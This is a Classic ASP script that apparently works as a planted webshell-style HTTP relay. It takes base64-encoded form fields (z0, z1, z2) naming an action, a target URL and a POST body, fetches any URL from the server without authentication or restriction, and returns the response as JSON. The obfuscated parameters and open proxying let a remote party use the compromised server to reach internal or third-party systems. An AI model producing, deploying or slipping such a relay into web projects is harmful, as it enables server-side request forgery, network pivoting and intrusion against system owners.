<%

Function HttpGet(url, ByRef http_code)

    Dim http
    Set http = Server.CreateObject("MSXML2.ServerXMLHTTP.6.0")

    http.Open "GET", url, False
    http.setRequestHeader "User-Agent", "ClassicASP"
    http.Send

    http_code = http.Status
    HttpGet = http.responseText

    Set http = Nothing
End Function

Function HttpPost(url, data, ByRef http_code)

    Dim http
    Set http = Server.CreateObject("MSXML2.ServerXMLHTTP.6.0")

    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.setRequestHeader "User-Agent", "ClassicASP"

    http.Send data

    http_code = http.Status
    HttpPost = http.responseText

    Set http = Nothing
End Function

Function JsonEscape(str)
    If IsNull(str) Then str = ""
    str = Replace(str, "\", "\\")
    str = Replace(str, """", "\""")
    str = Replace(str, vbCrLf, "\n")
    str = Replace(str, vbCr, "\n")
    str = Replace(str, vbLf, "\n")
    JsonEscape = str
End Function

Function Base64Decode(ByVal str)
    Dim xml, node

    Set xml = Server.CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b64")

    node.dataType = "bin.base64"
    node.text = str

    Base64Decode = node.nodeTypedValue

    Set node = Nothing
    Set xml = Nothing
End Function

Response.ContentType = "application/json"

Dim action
action = Base64Decode(Request.Form("z0"))

Dim result
result = "{""status"":""error"",""action"":""" & action & """,""http_code"":0,""data"":null}"

Select Case LCase(action)

    Case "get"
        Dim url, http_code, body
        url = Base64Decode(Request.Form("z1"))

        If url = "" Then
            result = "{""status"":""error"",""action"":""get"",""http_code"":0,""data"":""Missing URL""}"
            Response.Write result
            Response.End
        End If

        body = HttpGet(url, http_code)

        result = "{""status"":""ok"",""action"":""get"",""http_code"":" & http_code & ",""data"":""" & JsonEscape(body) & """}"


    Case "post"
        Dim postUrl, postData, postCode, postBody

        postUrl = Base64Decode(Request.Form("z1"))
        postData = Base64Decode(Request.Form("z2"))

        If postUrl = "" Then
            result = "{""status"":""error"",""action"":""post"",""http_code"":0,""data"":""Missing URL""}"
            Response.Write result
            Response.End
        End If

        postBody = HttpPost(postUrl, postData, postCode)

        result = "{""status"":""ok"",""action"":""post"",""http_code"":" & postCode & ",""data"":""" & JsonEscape(postBody) & """}"

    Case Else
        result = "{""status"":""error"",""action"":""" & action & """,""http_code"":0,""data"":""Invalid action""}"

End Select

Response.Write result

%>